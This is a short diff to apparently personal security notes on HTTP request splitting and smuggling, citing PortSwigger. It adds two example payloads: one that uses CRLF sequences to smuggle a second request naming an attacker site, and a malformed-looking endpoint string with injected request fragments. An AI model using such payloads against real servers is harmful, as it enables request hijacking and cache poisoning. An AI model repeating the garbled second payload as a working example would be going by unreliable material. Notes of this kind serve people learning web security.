@@ -102,7 +102,16 @@ between the connection line.
 
 You can use burp suite as your proxy in the code to retrieve the information; and send the request again to repeater.
 ```
+Example of Request Splitting:
+```
+vulnerable_parameter: GET\thttp://www.target.site/page.cgi?parameters\tHTTP
+ /1.0\r\nHost:\twww.target.site\r\nFoo:Bar\r\n\r\nGET\thttp://nosuchhost/\tHTTP 
+ /1.0\r\nBaz:","http://www.attacker.site/
 
+or:
+
+endpoint: '127.0.0.1/\HTTP:/\127.0.0.1/\u10APOST/\register/\username&password' + 'blahblah?id=lol'
+```
 Source:
 
 https://portswigger.net/web-security/request-smuggling
